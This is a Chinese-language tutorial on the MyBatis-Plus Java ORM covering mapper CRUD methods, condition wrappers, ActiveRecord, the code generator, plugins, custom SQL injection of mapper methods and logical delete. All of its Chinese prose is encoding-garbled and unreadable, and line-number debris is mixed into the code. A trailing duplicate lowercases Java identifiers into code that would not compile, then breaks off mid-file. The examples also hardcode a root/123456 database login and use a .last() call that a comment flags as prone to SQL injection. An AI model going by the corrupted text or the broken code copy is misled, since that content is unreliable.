employeeMapper.updateById(employee);\n    employeeMapper.updateAllColumnById(employee);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# Select\n\nMPæä¾äºå¤ä¸ªæ¥è¯¢æ¹æ³ï¼\n\n * selectById\n * selecgtOne\n * selectBatchsIds\n * selectByMap\n * selectPage\n\n# selectById\n\n@Test\npublic void testSelect(){\n    Employee employee = employeeMapper.selectById(1);\n    System.out.println(employee);\n}\n\n//Employee{id=1, lastName=\'null\', email=\'null\', gender=1, age=11}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# selectOne\n\nå¦ææä»¬éè¦å¶ä»çåè¿è¡æ¥è¯¢ï¼åä¸è½ä½¿ç¨selectByIdè¿è¡æ¥è¯¢äºãæä»¬éè¦ç¨å®ä½ç±»å°è£æä»¬éè¦æ¥è¯¢çæ¡ä»¶ï¼ç¶åä½¿ç¨selectOneè¿è¡æ¥è¯¢ãMPä¼å°æä»¬å°è£çéç©ºçå±æ§åå½æ¥è¯¢çæ¡ä»¶ã\n\n@Test\npublic void testSelect(){\n    //        Employee employee = employeeMapper.selectById(1);\n    //        System.out.println(employee);\n    Employee employee = new Employee();\n    employee.setAge(25);\n    employee.setGender(0);\n    Employee employee1 = employeeMapper.selectOne(employee);\n    System.out.println(employee1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nDEBUG 02-23 15:53:07,967 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee WHERE gender=? AND age=?  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\nå¦æå­å¨å¹éçå¤æ¡æ°æ®ï¼åæ¥è¯¢å°ä¼æ¥éã\n\n# selectBatchsIds\n\néè¿å¤ä¸ªIdè¿è¡æ¹éçæ¥è¯¢ã\n\nList<Integer> list = new ArrayList<>();\nlist.add(1);\nlist.add(2);\nlist.add(6);\nSystem.out.println(employeeMapper.selectBatchIds(list));\n\n\n1\n2\n3\n4\n5\n\n\næ¥è¯¢è¯­å¥:\n\nDEBUG 02-23 15:55:50,296 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee WHERE id IN ( ? , ? , ? )  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n# selectByMap\n\néè¿mapå°è£æä»¬çæ¥è¯¢æ¡ä»¶ï¼è·å¾æ¹éçç»æã\n\nHashMap<String, Object> map = new HashMap<>();\n// æ³¨æï¼ mapçkeyæ¯æ°æ®åºä¸­å¯¹åºçåå\nmap.put("last_name","zhangsan");\nmap.put("gender",1);\nSystem.out.println(employeeMapper.selectByMap(map));\n\n\n1\n2\n3\n4\n5\n\n\néè¦æ³¨æçæ¯ï¼selectByMapæ¥åçåæ°æ¯ä¸ä¸ªcolumnMapï¼ä¹å°±æ¯è¯´ï¼æä»¬å¨å°è£æ¥è¯¢æ¡ä»¶æ¶ï¼éè¦ä¼ å¥çmapçkeyå¯¹åºçæ¯æ°æ®åºä¸­çååç§°ï¼èä¸æ¯æä»¬javabeançå±æ§åã\n\n# selectPage\n\nselectPageæ¯MPå¸®å©æä»¬æ¹ä¾¿çè¿è¡åé¡µæ¥è¯¢çæ¹æ³ãè¯¥æ¹æ³æä¸¤ä¸ªåæ°ï¼ä¸ä¸ªæ¯RowBounds,è¿æwapperæ¡ä»¶æ¥è¯¢å¨ãå¶ä¸­RowBoundsæä»¬å¯ä»¥ä½¿ç¨è¯¥ç±»çå­ç±»Page\n\nList<T> selectPage(RowBounds var1, @Param("ew") Wrapper<T> var2);\n\n\n1\n\n\nä½¿ç¨æ¹æ³ï¼\n\nSystem.out.println(employeeMapper.selectPage(new Page<>(2, 2), null));\n\n\n1\n\n\næ¥è¯¢è¯­å¥:\n\nDEBUG 02-23 16:05:17,595 ==>  Preparing: SELECT id,last_name AS lastName,email,gender,age FROM tbl_employee  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\næä»¬åç°ï¼MPä¸æ¯ä½¿ç¨limitå³é®å­è¿è¡åé¡µçï¼MPåºå±è¿æ¯å©ç¨RowBoundsè¿è¡å®ç°çãè¯¥åé¡µæ¯ä½¿ç¨äºåå­åé¡µçææ¯å®ç°çï¼å¦æè¦ä½¿ç¨ç©çåé¡µï¼éè¦ä½¿ç¨ç¸å³çåé¡µæä»¶ã\n\n\n# delete\n\nMPæä¾çéç¨å é¤æ¹æ³æå¦ä¸å ç§ï¼\n\n * deleteById\n * deleteByMap\n * deleteByBatchIds\n\nä½¿ç¨æ¹æ³ï¼\n\n//1. æ ¹æ®idè¿è¡å é¤æä½\nSystem.out.println(employeeMapper.deleteById(11));\n//2. æ ¹æ®mapå°è£å é¤æ¡ä»¶\nHashMap<String, Object> map = new HashMap<>();\nmap.put("last_name","zhangsan");\nmap.put("id",10);\nSystem.out.println(employeeMapper.deleteByMap(map));\n\n//3. æ¹éå é¤æä½\nArrayList<Integer> list = new ArrayList<>();\nlist.add(1);\nlist.add(2);\nlist.add(3);\nSystem.out.println(employeeMapper.deleteBatchIds(list));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# MPå¯å¨æ³¨å¥SQLçåç\n\né®é¢ï¼xxxMapperç»§æ¿äºBaseMapperï¼BaseMapperä¸­æä¾äºç¸å³çCRUDæ¹æ³ï¼é£ä¹å¿é¡»è¿æSQLè¯­å¥ï¼æç»è¿æ¯éè¿Mybatisè¿è¡æä½æ°æ®ã\n\n 1. XXXMapperçæ¬è´¨æ¯ä¸ä¸ªä»£çç±»çå¯¹è±¡ã\n 2. å¨MapperProxyä¸­æä¸ä¸ªSQLSessionï¼SQLSessionæä»¬è½æ¾å°å·ä½çSQLSessionFactory\n 3. å¨SQLSessionFactoryä¸­æä¸ä¸ªCOnfigurationå¯¹è±¡ï¼è¯¥å¯¹è±¡ä¸­ä¼æMapStatedmentå¯¹è±¡ï¼è¯¥å¯¹è±¡å°è£äºæä»¬å·ä½çæ¥è¯¢è¯­å¥ã\n 4. å¨MPä¸­æä¸ä¸ªSQLèªå¨æ³¨å¥ç±»ï¼AutoSqlInjectorï¼è¯¥ç±»è´è´£æ³¨å¥SQLè¯­å¥ã\n\n\n# æ¡ä»¶æé å¨\n\nç°æä¸ä¸ªéæ±ï¼æä»¬éè¦åé¡µæ¥è¯¢tbl_employeeè¡¨ä¸­ï¼å¹´é¾å¨18~50ä¹é´ãæ§å«ä¸ºç·ãä¸å§åä¸º xx çææç¨æ·ï¼è¿æ¶åæä»¬è¯¥å¦ä½å®ç°ä¸è¿°éæ±å¢ï¼\n\nMyBatis : éè¦å¨SQLæ å°æä»¶ä¸­ç¼åå¸¦æ¡ä»¶æ¥è¯¢çSQL,å¹¶åºäºPageHelperæä»¶å®æåé¡µ.\n\nå®ç°ä»¥ä¸ä¸ä¸ªç®åçéæ±ï¼å¾å¾éè¦æä»¬åå¾å¤éå¤åè°çå·¥ä½ãæ®éçMapperè½å¤è§£å³è¿ç±»çç¹åï¼\n\nMP: ä¾æ§ä¸ç¨ç¼åSQLè¯­å¥, MPæä¾äºåè½å¼ºå¤§çæ¡ä»¶æé å¨EntityWrapperã\n\næ¡ä»¶æé å¨ç±»ä¼¼äºMybatiséé¢éåå·¥ç¨ä¸­çæçxxxExampleï¼æä»¬å¯ä»¥ä½¿ç¨Criteriaè¿è¡æ¥è¯¢ï¼è¿ç§æ¥è¯¢é£æ ¼ç§°ä¹ä¸ºQBC(Query by Criteria)ï¼å¨MPä¸­ç§°ä¸ºæ¡ä»¶æé å¨ãMPä¸­æä¸¤ç§æ¹å¼ä½¿ç¨æ¡ä»¶æé å¨ï¼åå«æ¯EntityWrapperåConditionãä¸¤ç§æ¹å¼ä½¿ç¨åºæ¬ç±»ä¼¼ã\n\nä½¿ç¨æ¡ä»¶æé å¨å®æå¢å æ¹æ¥ï¼\n\n    @Test\n    public void QBC(){\n        // ä½¿ç¨EWè¿è¡åé¡µæ¥è¯¢\n        System.out.println(employeeMapper.selectPage(new RowBounds(1, 3),\n                new EntityWrapper<Employee>()\n                        .eq("last_name", "zhangsan")\n                        .orNew() // orNewä¼å°åé¢ææçæ¡ä»¶ä½ä¸ºä¸ä¸ªæ´ä½\n                        //                        .or() // orä¼ååé¢çæ¡ä»¶å¹¶å\n                        .eq("gender", 0)\n        ));\n\n        // ä½¿ç¨EWæ¥è¯¢åè¡¨\n        System.out.println(employeeMapper.selectList(new EntityWrapper<Employee>()\n                .eq("last_name", "zhangsan")\n                .between("age", 10, 20)\n        ));\n\n        // ä½¿ç¨EWæ¡ä»¶æ´æ°\n        Employee employee = new Employee();\n        employee.setLastName("lisi");\n        employee.setGender(0);\n        employeeMapper.update(employee,new EntityWrapper<Employee>()\n                .eq("id",8)\n        );\n\n        //ä½¿ç¨conditionè¿è¡æ¡ä»¶å é¤\n        employeeMapper.delete(\n                Condition.create()\n                        .eq("id",8)\n        );\n\n        // last orderbyæ¥è¯¢\n        System.out.println(employeeMapper.selectList(new EntityWrapper<Employee>()\n//                .orderDesc(Arrays.asList("age"))\n//                .orderAsc(Arrays.asList("age"))\n//                        .orderBy("age")\n                        .last("order by age desc")  // å®¹æé æSQLæ³¨å¥\n        ));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# æ´»å¨è®°å½ - ActiveRecord\n\nActive Record(æ´»å¨è®°å½)ï¼æ¯ä¸ç§é¢åæ¨¡åæ¨¡å¼ï¼ç¹ç¹æ¯ä¸ä¸ªæ¨¡åç±»å¯¹åºå³ç³»åæ°æ®åºä¸­çä¸ä¸ªè¡¨ï¼èæ¨¡åç±»çä¸ä¸ªå®ä¾å¯¹åºè¡¨ä¸­çä¸è¡è®°å½ã\n\nå¼å¯ARï¼éè¦è®©è¢«æ¥è¯¢çå®ä½ç±»ç»§æ¿Modelç±»ï¼å¹¶ä¸å®ç°ç¸åºçæ¹æ³ãæ¹æ³è¿åä¸»é®ã\n\npublic class Employee extends Model<Employee> {\n    @Override\n    protected Serializable pkVal() {\n        return id;\n    }\n\n\n1\n2\n3\n4\n5\n\n\nåºç¡æä½ï¼\n\n1) æå¥æä½\npublic boolean insert()\n2) ä¿®æ¹æä½\npublic boolean updateById()\n3) æ¥è¯¢æä½\npublic T selectById()\npublic T selectById(Serializable id)\npublic List&lt;T> selectAll()\npublic List&lt;T> selectList(Wrapper wrapper)\npublic int selectCount(Wrapper wrapper)\n4) å é¤æä½\npublic boolean deleteById()\npublic boolean deleteById(Serializable id)\npublic boolean delete(Wrapper wrapper)\n5) åé¡µå¤ææä½\npublic Page&lt;T> selectPage(Page&lt;T> page, Wrapper&lt;T> wrapper)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n@Test\npublic void testAR(){\n    // æå¥æä½\n    Employee employee = new Employee();\n    employee.setLastName("lisi");\n    employee.setAge(23);\n    employee.setEmail("zhangsan@qq.com");\n    employee.setGender(1);\n    employee.insert();\n    //ä¿®æ¹æä½\n    employee.setId(7);\n    employee.updateById();\n    // æ¥è¯¢æä½\n    System.out.println(employee.selectById());\n    System.out.println(employee.selectById(6));\n    System.out.println(employee.selectAll());\n    System.out.println(employee.selectList(new EntityWrapper().eq("last_name", "zhangsan")));\n    System.out.println(employee.selectCount(new EntityWrapper().eq("last_name", "zhangsan")));\n    //å é¤æä½\n    employee.deleteById();\n    employee.deleteById(1);\n    employee.delete(new EntityWrapper().eq("id",20));\n\n    System.out.println(employee.selectPage(new Page<>(1, 2),\n                                           new EntityWrapper<Employee>().like("last_name", "%a%")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# ä»£ç çæå¨\n\nMPæä¾äºå¤§éçèªå®ä¹è®¾ç½®ï¼çæçä»£ç å®å¨è½å¤æ»¡è¶³åç±»åçéæ±\n\nMPçä»£ç çæå¨åMybatisMBGä»£ç çæå¨:\n\nMP çä»£ç çæå¨é½æ¯åºäº java ä»£ç æ¥çæã\n\nMBG åºäº xml æä»¶è¿è¡ä»£ç çæã\n\nMyBatisçä»£ç çæå¨å¯çæ: å®ä½ç±»ãMapperæ¥å£ãMapperæ å°æä»¶\n\nMPçä»£ç çæå¨å¯çæ: å®ä½ç±»(å¯ä»¥éæ©æ¯å¦æ¯æ AR)ãMapperæ¥å£ãMapperæ å°æä»¶ã Serviceå±ãControllerå±ã\n\næ·»å ä¾èµ\n\nç±äºMPä½¿ç¨çæ¯åºäºApacheçVelocityæ¨¡æ¿ææ¯ï¼å æ­¤éè¦å¼å¥ç¸å³çä¾èµåï¼åæ¶ä¹å¯ä»¥æ¿æ¢ä¸ºå¶ä»çæ¨¡æ¿ãå¹¶ä¸éè¦æ·»å æ¥å¿ç¸å³çä¾èµã\n\n<dependency>\n <groupId>org.apache.velocity</groupId>\n <artifactId>velocity-engine-core</artifactId>\n <version>2.0</version>\n</dependency>\n\n<dependency>\n<groupId>org.slf4j</groupId>\n<artifactId>slf4j-api</artifactId>\n<version>1.7.7</version>\n</dependency>\n<dependency>\n<groupId>org.slf4j</groupId>\n<artifactId>slf4j-log4j12</artifactId>\n<version>1.7.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nçæä»£ç \n\n@Test\npublic void testGenerator() {\n    /*å¨å±éç½®*/\n    GlobalConfig config = new GlobalConfig();\n    config.setActiveRecord(true) /*æ¯å¦æ¯æARæ¨¡å¼*/\n        .setAuthor("JM") /*ä½è*/\n        .setOutputDir("E:\\\\Workspace\\\\Code\\\\Java\\\\study\\\\mybatisplus\\\\src\\\\main\\\\java")\n        /*çæè·¯å¾*/\n        .setFileOverride(true)/*æä»¶è¦ç*/\n        .setServiceName("%sService") /*è®¾ç½®çæçserviceæ¥å£å  é¦å­æ¯æ¯å¦ä¸ºI*/\n        .setIdType(IdType.AUTO) /*ä¸»é®ç­ç¥*/\n        ;\n\n    /*æ°æ®æºéç½®*/\n    DataSourceConfig dsConfig = new DataSourceConfig();\n    dsConfig.setDbType(DbType.MYSQL)\n        .setUrl("jdbc:mysql://localhost:3306/mybatisplus")\n        .setDriverName("com.mysql.jdbc.Driver")\n        .setUsername("root")\n        .setPassword("123456");\n    /*ç­ç¥éç½®*/\n    StrategyConfig stConfig = new StrategyConfig();\n    stConfig.setCapitalMode(true) /* å¨å±å¤§åå½å*/\n        .setDbColumnUnderline(true) /*è¡¨å å­æ®µå æ¯å¦ä½¿ç¨ä¸æ» çº¿å½å*/\n        .setNaming(NamingStrategy.underline_to_camel) /* æ°æ® åºè¡¨æ å°å°å®ä½çå½åç­ç¥*/\n        .setInclude("tbl_employee") /*çæçè¡¨*/\n        .setTablePrefix("tbl_"); // è¡¨åç¼\n    /*ååç­ç¥*/\n    PackageConfig pkConfig = new PackageConfig();\n    pkConfig.setParent("com.pwddd.mp")\n        .setController("controller")\n        .setEntity("beans")\n        .setService("service");\n    AutoGenerator ag = new\n        AutoGenerator().setGlobalConfig(config).setDataSource(dsConfig)\n        .setStrategy(stConfig)\n        .setPackageInfo(pkConfig);\n    ag.execute();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# æä»¶\n\n\n# åé¡µæä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨ååé¡µæä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.PaginationInterceptor"></bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ§è¡åææä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åæ§è¡åææä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.SqlExplainInterceptor">\n            <property name="stopProceed" value="true"></property>\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# ä¹è§éæä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åä¹è§éæä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.OptimisticLockerInterceptor">\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ§è¡åææä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åæ§è½åææä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.PerformanceInterceptor">\n            <property name="format" value="true"></property>\n            \x3c!-- <property name="maxTime" value="5"></property> --\x3e\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æµè¯ä»£ç \n\npublic class TestMP {\n    ApplicationContext ctx  = new ClassPathXmlApplicationContext("applicationContext.xml");\n    EmployeeMapper employeeMapper = ctx.getBean("employeeMapper",EmployeeMapper.class);\n\n    /**\n\t * æµè¯ ä¹è§éæä»¶\n\t */\n\n    @Test\n    public void testOptimisticLocker() {\n        //æ´æ°æä½\n        Employee employee = new Employee();\n        employee.setId(15);\n        employee.setLastName("TomAA");\n        employee.setEmail("tomAA@sina.com");\n        employee.setGender("1");\n        employee.setAge(22);\n        employee.setVersion(3);\n        employeeMapper.updateById(employee);\n\n    }\n\n    /**\n\t * æµè¯ æ§è½åææä»¶\n\t */\n    @Test\n    public void testPerformance() {\n        Employee employee = new Employee();\n        employee.setLastName("çå©äºèå¸");\n        employee.setEmail("mly@sina.com");\n        employee.setGender("0");\n        employee.setAge(22);\n        employeeMapper.insert(employee);\n\n    }\n\n    /**\n\t * æµè¯SQLæ§è¡åææä»¶\n\t */\n    @Test\n    public void testSQLExplain() {\n\n        employeeMapper.delete(null);  // å¨è¡¨å é¤\n    }\n\n    /**\n\t * æµè¯åé¡µæä»¶\n\t */\n    @Test\n    public void testPage() {\n        Page<Employee> page = new Page<>(1,1);\n        List<Employee > emps = \n            employeeMapper.selectPage(page, null);\n        System.out.println(emps);\n        System.out.println("===============è·ååé¡µç¸å³çä¸äºä¿¡æ¯======================");\n        System.out.println("æ»æ¡æ°:" +page.getTotal());\n        System.out.println("å½åé¡µç : "+  page.getCurrent());\n        System.out.println("æ»é¡µç :" + page.getPages());\n        System.out.println("æ¯é¡µæ¾ç¤ºçæ¡æ°:" + page.getSize());\n        System.out.println("æ¯å¦æä¸ä¸é¡µ: " + page.hasPrevious());\n        System.out.println("æ¯å¦æä¸ä¸é¡µ: " + page.hasNext());\n\n        //å°æ¥è¯¢çç»æå°è£å°pageå¯¹è±¡ä¸­\n        page.setRecords(emps);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n\n# èªå®ä¹å¨å±æä½\n\n\n# AutoSqlInjector\n\næ ¹æ®MybatisPlusçAutoSqlInjectorå¯ä»¥èªå®ä¹åç§ä½ æ³è¦çsql ,æ³¨å¥å°å¨å±ä¸­ï¼ç¸å½äºèªå®ä¹Mybatisplusèªå¨æ³¨å¥çæ¹æ³ã\n\n 1. å¨Mapperæ¥å£ä¸­å®ä¹ç¸å³çæ¹æ³\n    \n    public interface EmployeeMapper extends BaseMapper<Employee> {\n        int deleteAll();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n 2. æ©å±AutoSqlInjector.injectæ¹æ³ï¼å®ç°Mapperæ¥å£ä¸­æ¹æ³è¦æ³¨å¥çSQL\n    \n    public class MyInjector extends AutoSqlInjector {\n        @Override\n        public void inject(Configuration configuration, MapperBuilderAssistant builderAssistant, Class<?> mapperClass, Class<?> modelClass, TableInfo table) {\n            //å°EmployeeMapperä¸­å®ä¹çdeleteAllï¼ å¤çæå¯¹åºçMappedStatementå¯¹è±¡ï¼å å¥å°configurationå¯¹è±¡ä¸­ã\n    \n            //æ³¨å¥çSQLè¯­å¥\n            String sql = "delete from " +table.getTableName();\n            //æ³¨å¥çæ¹æ³å   ä¸å®è¦ä¸EmployeeMapperæ¥å£ä¸­çæ¹æ³åä¸è´\n            String method = "deleteAll" ;\n    \n            //æé SqlSourceå¯¹è±¡\n            SqlSource sqlSource = languageDriver.createSqlSource(configuration, sql, modelClass);\n    \n            //æé ä¸ä¸ªå é¤çMappedStatement\n            this.addDeleteMappedStatement(mapperClass, method, sqlSource);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. å¨MPå¨å±ç­ç¥ä¸­ï¼éç½®èªå®ä¹æ³¨å¥å¨\n    \n    <bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n        <property name="dbColumnUnderline" value="true" />\n        \x3c!--å¨å±éç½® --\x3e\n        <property name="idType" value="0" />\n    \n        <property name="tablePrefix" value="tbl_" />\n        <property name="sqlInjector" ref="injector" />\n        </bean>\n    \n        <bean class="com.pwddd.mp.mpconfig.MyInjector" id="injector"/>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n\n# é»è¾å é¤\n\nåå é¤ãé»è¾å é¤: å¹¶ä¸ä¼çæ­£çä»æ°æ®åºä¸­å°æ°æ®å é¤æï¼èæ¯å°å½åè¢«å é¤çè¿æ¡æ°æ®ä¸­çä¸ä¸ªé»è¾å é¤å­æ®µç½®ä¸ºå é¤ç¶æã\n\n 1. éç½®é»è¾å é¤bean\n    \n    \x3c!-- é»è¾å é¤ --\x3e\n    \t<bean id="logicSqlInjector" class="com.baomidou.mybatisplus.mapper.LogicSqlInjector"></bean>\n    \n    \n    1\n    2\n    \n\n 2. æ³¨å¥é»è¾å é¤å±æ§\n    \n    \x3c!-- æ³¨å¥é»è¾å é¤ --\x3e\n        <property name="sqlInjector" ref="logicSqlInjector" />\n    \n    \n    1\n    2\n    \n\n 3. éç½®é»è¾å é¤å¼\n    \n    \x3c!-- æ³¨å¥é»è¾å é¤å¨å±å¼ --\x3e\n    <property name="logicDeleteValue" value = "-1"></property>\n    <property name="logicNotDeleteValue" value="1"></property>\n    \n    \n    1\n    2\n    3\n    \n\n 4. å¨ POJO çé»è¾å é¤å­æ®µ æ·»å  @TableLogic æ³¨è§£\n    \n    @TableLogic\n    private Integer logic_flag;\n    \n    \n    1\n    2\n    \n\n 5. æ§è¡å é¤ï¼ä¼å¨mpèªå¸¦æ¥è¯¢åæ´æ°æ¹æ³çsqlåé¢ï¼è¿½å ãé»è¾å é¤å­æ®µã=ãLogicNotDeleteValue é»è®¤å¼ã\n\n 6. å é¤æ¹æ³: deleteById()åå¶ä»deleteæ¹æ³, åºå±SQLè°ç¨çæ¯update tbl_xxx set ãé»è¾å é¤å­æ®µã=ãlogicDeleteValue é»è®¤å¼ã\n\n\n# å¬å±å­æ®µèªå¨å¡«å\n\nmetaobject: åå¯¹è±¡ãæ¯Mybatisæä¾çä¸ä¸ªç¨äºæ´å æ¹ä¾¿ï¼æ´å ä¼éçè®¿é®å¯¹è±¡çå±æ§, ç»å¯¹è±¡çå±æ§è®¾ç½®å¼çä¸ä¸ªå¯¹è±¡ãè¿ä¼ç¨äºåè£å¯¹è±¡ãæ¯æå¯¹Object ãMapãCollectionç­å¯¹è±¡è¿è¡åè£ã\n\n 1. éç½®èªå¨å¡«åbeanï¼å¹¶æ³¨åå±æ§\n    \n    \x3c!-- å¬å±å­æ®µå¡«å å¤çå¨ --\x3e\n    <bean id="myMetaObjectHandler" class="com.atguigu.mp.metaObjectHandler.MyMetaObjectHandler"> </bean>\n    \x3c!-- æ³¨å¥å¬å±å­æ®µå¡«åå¤çå¨ --\x3e\n    <property name="metaObjectHandler" ref="myMetaObjectHandler"></property>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. ç¼åç¸å³ç±»\n    \n    /**\n     * èªå®ä¹å¬å±å­æ®µå¡«åå¤çå¨\n     */\n    public class MyMetaObjectHandler extends MetaObjectHandler {\n    \t\n    \t/**\n    \t * æå¥æä½ èªå¨å¡«å\n    \t */\n    \t@Override\n    \tpublic void insertFill(MetaObject metaObject) {\n    \t\t//è·åå°éè¦è¢«å¡«åçå­æ®µçå¼\n    \t\tObject fieldValue = getFieldValByName("name", metaObject);\n    \t\tif(fieldValue == null) {\n    \t\t\tSystem.out.println("*******æå¥æä½ æ»¡è¶³å¡«åæ¡ä»¶*********");\n    \t\t\tsetFieldValByName("name", "weiyunhui", metaObject);\n    \t\t}\n    \t\t\n    \t}\n    \t/**\n    \t * ä¿®æ¹æä½ èªå¨å¡«å\n    \t */\n    \t@Override\n    \tpublic void updateFill(MetaObject metaObject) {\n    \t\tObject fieldValue = getFieldValByName("name", metaObject);\n    \t\tif(fieldValue == null) {\n    \t\t\tSystem.out.println("*******ä¿®æ¹æä½ æ»¡è¶³å¡«åæ¡ä»¶*********");\n    \t\t\tsetFieldValByName("name", "weiyh", metaObject);\n    \t\t}\n    \t}\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    \n\n 3. èªå¨å¡«åæ¶ï¼å¦ææä»¬è§å®çå­æ®µä¸ºnullï¼åè¿è¡èªå¨å¡«åã\n\n\n# Ideaæä»¶\n\nMybaitsXæä»¶ï¼å¯ä»¥æä¾Mapperæä»¶åå¯¹åºæ¥å£ä¹é´çå³èåè·³è½¬ã',normalizedContent:'# mybatisplus\n\n> mybatis-plus(ç®ç§° mp),æ¯ä¸ä¸ª mybatis çå¢å¼ºå·¥å·åï¼åªåå¢å¼ºä¸åæ¹åã ä¸ºç®åå¼åå·¥ä½ãæé«çäº§çèçæä»¬çæ¿æ¯æ¯æä¸º mybatisæå¥½çæ­æ¡£ï¼å°±åé­æç½ä¸­ç 1pã2pï¼åºåæ­éï¼æçç¿»åã\n\n\n# ç¸å³èµæº\n\nmybatis-plus (baomidou.com)\n\ngithub - mybatis-plus\n\n\n# åæåå¤\n\n\n# åå»ºåºè¡¨\n\n-- åå»ºåº\ncreate database mp;\n-- ä½¿ç¨åº\nuse mp;\n-- åå»ºè¡¨\ncreate table tbl_employee(\n id int(11) primary key auto_increment,\n last_name varchar(50),\n email varchar(50),\n gender char(1),\n age int\n);\ninsert into tbl_employee(last_name,email,gender,age) values(\'tom\',\'tom@atguigu.com\',1,22);\ninsert into tbl_employee(last_name,email,gender,age) values(\'jerry\',\'jerry@atguigu.com\',0,25);\ninsert into tbl_employee(last_name,email,gender,age) values(\'black\',\'black@atguigu.com\',1,30);\ninsert into tbl_employee(last_name,email,gender,age) values(\'white\',\'white@atguigu.com\',0,35);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ç¼åå¯¹åºçjavabean\n\npackage com.pwddd.mp.bean;\n\npublic class employee {\n    private integer id;\n    private string lastname;\n    private string email;\n    private integer gender;\n    private integer age;\n\n    @override\n    public string tostring() {\n        return "employee{" +\n                "id=" + id +\n                ", lastname=\'" + lastname + \'\\\'\' +\n                ", email=\'" + email + \'\\\'\' +\n                ", gender=" + gender +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public integer getid() {\n        return id;\n    }\n\n    public void setid(integer id) {\n        this.id = id;\n    }\n\n    public string getlastname() {\n        return lastname;\n    }\n\n    public void setlastname(string lastname) {\n        this.lastname = lastname;\n    }\n\n    public string getemail() {\n        return email;\n    }\n\n    public void setemail(string email) {\n        this.email = email;\n    }\n\n    public integer getgender() {\n        return gender;\n    }\n\n    public void setgender(integer gender) {\n        this.gender = gender;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n\n    public employee() {\n    }\n\n    public employee(integer id, string lastname, string email, integer gender, integer age) {\n        this.id = id;\n        this.lastname = lastname;\n        this.email = email;\n        this.gender = gender;\n        this.age = age;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# å¯¼å¥ä¾èµ\n\n<dependencies>\n\n    \x3c!-- mp ä¾èµ --\x3e\n    <dependency>\n        <groupid>com.baomidou</groupid>\n        <artifactid>mybatis-plus</artifactid>\n        <version>2.3</version>\n    </dependency>\n    \x3c!--junit --\x3e\n    <dependency>\n        <groupid>junit</groupid>\n        